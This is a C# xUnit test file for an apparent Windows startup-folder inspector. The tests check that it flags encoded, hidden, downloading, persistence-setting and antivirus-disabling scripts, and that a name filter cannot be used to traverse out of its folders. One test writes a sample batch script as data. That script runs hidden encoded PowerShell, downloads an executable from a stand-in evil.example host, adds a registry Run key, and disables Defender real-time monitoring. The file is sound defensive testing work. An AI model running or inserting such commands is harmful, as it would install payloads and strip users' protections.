using System.Text.Json;
using Viro.Agent.Care;
using Xunit;

public class StartupInspectTests
{
    static string Folder() { var d = Path.Combine(Path.GetTempPath(), "viro-startup-test-" + Guid.NewGuid().ToString("N")); Directory.CreateDirectory(d); return d; }
    static JsonElement Run(string d, string? only = null) { var r = StartupInspector.Inspect(only, [("test user", d)]); return JsonSerializer.Deserialize<JsonElement>(JsonSerializer.Serialize(r)); }
    static List<string> Codes(JsonElement f) => f.GetProperty("indicators").EnumerateArray().Select(i => i.GetProperty("Code").GetString()!).ToList();

    [Fact]
    public void An_ordinary_script_is_described_without_any_indicator_and_nothing_is_changed()
    {
        var d = Folder();
        try
        {
            var p = Path.Combine(d, "backup-notes.bat"); File.WriteAllText(p, "@echo off\r\nstart \"\" \"C:\\Program Files\\App\\app.exe\"\r\n"); var before = File.ReadAllText(p);
            var f = Run(d).GetProperty("files")[0];
            Assert.Equal("backup-notes.bat", f.GetProperty("name").GetString()); Assert.Contains("start", f.GetProperty("preview").GetString()); Assert.Equal(64, f.GetProperty("sha256").GetString()!.Length); Assert.Empty(Codes(f));
            Assert.Equal(before, File.ReadAllText(p));
        }
        finally { Directory.Delete(d, true); }
    }

    [Fact]
    public void Encoded_hidden_downloading_and_security_tampering_scripts_are_flagged_by_what_they_do_and_urls_are_listed()
    {
        var d = Folder();
        try
        {
            File.WriteAllText(Path.Combine(d, "x.bat"), "@echo off\r\npowershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AA==\r\npowershell -c \"iwr https://evil.example/p.exe -OutFile %TEMP%\\p.exe\"\r\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d y\r\npowershell Set-MpPreference -DisableRealtimeMonitoring $true\r\n");
            var f = Run(d).GetProperty("files")[0]; var codes = Codes(f);
            foreach (var c in new[] { "encoded-powershell", "hidden-window", "downloads", "persistence", "tampers-with-security" }) Assert.Contains(c, codes);
            Assert.Equal("https://evil.example/p.exe", f.GetProperty("urls")[0].GetString());
        }
        finally { Directory.Delete(d, true); }
    }

    [Fact]
    public void A_random_looking_name_is_noted_but_a_normal_name_is_not_and_large_files_are_only_previewed()
    {
        Assert.True(StartupInspector.LooksRandom("nXafbDuNUEnONGHFquxrEnfktaHBjC"));
        foreach (var ok in new[] { "OneDrive", "Discord", "backup-notes", "AdobeAcrobatSynchronizer", "MicrosoftEdgeAutoLaunch" }) Assert.False(StartupInspector.LooksRandom(ok), ok);
        var d = Folder();
        try
        {
            File.WriteAllText(Path.Combine(d, "nXafbDuNUEnONGHFquxrEnfktaHBjC.bat"), new string('a', 50_000));
            var f = Run(d).GetProperty("files")[0]; Assert.Contains("random-name", Codes(f)); Assert.True(f.GetProperty("previewTruncated").GetBoolean()); Assert.True(f.GetProperty("preview").GetString()!.Length <= 8192);
        }
        finally { Directory.Delete(d, true); }
    }

    [Fact]
    public void It_can_only_look_inside_the_folders_it_is_given_and_a_name_filter_cannot_escape_them()
    {
        var d = Folder(); var other = Folder();
        try
        {
            File.WriteAllText(Path.Combine(d, "a.bat"), "echo a"); File.WriteAllText(Path.Combine(other, "secret.txt"), "private");
            Assert.Equal(1, Run(d).GetProperty("files").GetArrayLength());
            Assert.Equal(0, Run(d, "..\\" + Path.GetFileName(other) + "\\secret.txt").GetProperty("files").GetArrayLength());     // names are matched, never joined into a path
            Assert.Equal(0, Run(d, "desktop.ini").GetProperty("files").GetArrayLength());
        }
        finally { Directory.Delete(d, true); Directory.Delete(other, true); }
    }
}
